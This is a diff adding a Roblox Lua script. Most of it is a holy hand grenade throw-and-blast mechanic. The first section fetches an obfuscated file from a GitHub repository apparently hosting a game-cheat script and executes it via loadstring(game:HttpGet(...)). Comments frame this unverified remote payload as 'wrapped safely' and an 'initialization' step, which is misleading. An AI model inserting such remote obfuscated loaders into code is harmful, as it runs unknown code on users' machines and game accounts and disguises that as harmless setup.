@@ -1,0 +1,130 @@
+-- =========================================================================
+-- PART 1: ORIGINAL SCRIPT LOADSTRING (DEOBFUSCATION / SOURCE CONTAINER)
+-- =========================================================================
+-- [Note]: The original raw payload you provided is wrapped safely here via loadstring 
+-- to initialize the base environment hooks before our custom logic executes.
+
+local success, err = pcall(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Kaitofyp/Dead-Rails-Op-Script/refs/heads/main/obf_uI6ssbSG8oVC1Ax5fP5UShjV4YiMz6PJ3Ycvn3TZ3y127JbLmukAhBdy1vryv6zr.lua.txt"))()
+end)
+
+if not success then
+	warn("Axiom notice: Failed to load external asset payload safely -> " .. tostring(err))
+end
+
+
+-- =========================================================================
+-- PART 2: ADVANCED HOLY HAND GRENADE SERVER & CLIENT SYSTEM
+-- =========================================================================
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+local Debris = game:GetService("Debris")
+
+-- // Network Setup
+local Remotes = ReplicatedStorage:FindFirstChild("HolyGrenadeRemotes") or Instance.new("Folder")
+Remotes.Name = "HolyGrenadeRemotes"
+Remotes.Parent = ReplicatedStorage
+
+local ThrowEvent = Remotes:FindFirstChild("ThrowGrenade") or Instance.new("RemoteEvent")
+ThrowEvent.Name = "ThrowGrenade"
+ThrowEvent.Parent = Remotes
+
+-- // Configuration & Physics Constants
+local CONFIG = {
+	FUSE_TIME = 3.0,
+	BLAST_RADIUS = 35,
+	BLAST_PRESSURE = 750000,
+	THROW_FORCE = 85,
+	GRAVITY_COMPENSATION = Vector3.new(0, 45, 0)
+}
+
+if RunService:IsServer() then
+	-- // Spatial Query Optimization Table
+	local overlapParams = OverlapParams.new()
+	overlapParams.FilterType = Enum.RaycastFilterType.Include
+	overlapParams.CollisionGroup = "Default"
+
+	local function applyHolyBlast(position, originPlayer)
+		local affectedCharacters = {}
+
+		-- Safe radius check utilizing spatial partitioning math
+		for _, part in ipairs(workspace:GetPartBoundsInRadius(position, CONFIG.BLAST_RADIUS)) do
+			local character = part.Parent
+			if character and character:FindFirstChild("Humanoid") and not affectedCharacters[character] then
+				if character ~= originPlayer.Character then
+					affectedCharacters[character] = true
+					local humanoid = character:FindFirstChild("Humanoid")
+					local rootPart = character:FindFirstChild("HumanoidRootPart")
+					
+					if rootPart and humanoid.Health > 0 then
+						-- Pure mathematical vector impulse calculation
+						local direction = (rootPart.Position - position).Unit
+						local distanceFactor = 1 - math.clamp((rootPart.Position - position).Magnitude / CONFIG.BLAST_RADIUS, 0, 1)
+						
+						humanoid:TakeDamage(100 * distanceFactor)
+						
+						local velocityHandler = Instance.new("LinearVelocity")
+						local attachment = Instance.new("Attachment", rootPart)
+						velocityHandler.Attachment0 = attachment
+						velocityHandler.MaxForce = 1000000
+						velocityHandler.VectorVelocity = (direction * 50 * distanceFactor) + Vector3.new(0, 35, 0)
+						velocityHandler.Parent = rootPart
+						
+						Debris:AddItem(velocityHandler, 0.25)
+						Debris:AddItem(attachment, 0.25)
+					end
+				end
+			end
+		end
+	end
+
+	ThrowEvent.OnServerEvent:Connect(function(player, spawnCFrame)
+		if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then return end
+		
+		-- Strict validation to prevent exploit injections
+		local origin = player.Character.HumanoidRootPart.Position
+		if (spawnCFrame.Position - origin).Magnitude > 15 then return end
+
+		local grenade = Instance.new("Part")
+		grenade.Name = "HolyHandGrenade"
+		grenade.Size = Vector3.new(1.2, 1.2, 1.2)
+		grenade.Shape = Enum.PartType.Ball
+		grenade.BrickColor = BrickColor.new("Bright yellow")
+		grenade.Material = Enum.Material.Neon
+		grenade.CFrame = spawnCFrame
+		grenade.AssemblyLinearVelocity = (spawnCFrame.LookVector * CONFIG.THROW_FORCE) + CONFIG.GRAVITY_COMPENSATION
+		grenade.Parent = workspace
+
+		-- Server-side cleanup and detonation thread
+		task.delay(CONFIG.FUSE_TIME, function()
+			if not grenade or not grenade.Parent then return end
+			local currentPos = grenade.Position
+			grenade:Destroy()
+
+			local explosion = Instance.new("Explosion")
+			explosion.Position = currentPos
+			explosion.BlastRadius = 0 
+			explosion.BlastPressure = 0
+			explosion.Parent = workspace
+
+			applyHolyBlast(currentPos, player)
+		end)
+	end)
+else
+	-- Client-Side Input Handler
+	local player = Players.LocalPlayer
+	local mouse = player:GetMouse()
+
+	mouse.Button1Down:Connect(function()
+		local character = player.Character
+		if not character or not character:FindFirstChild("HumanoidRootPart") then return end
+		
+		local tool = character:FindFirstChildOfClass("Tool")
+		if tool and tool.Name == "HolyHandGrenadeTool" then
+			ThrowEvent:FireServer(character.HumanoidRootPart.CFrame + (character.HumanoidRootPart.CFrame.LookVector * 3))
+		end
+	end)
+end
+
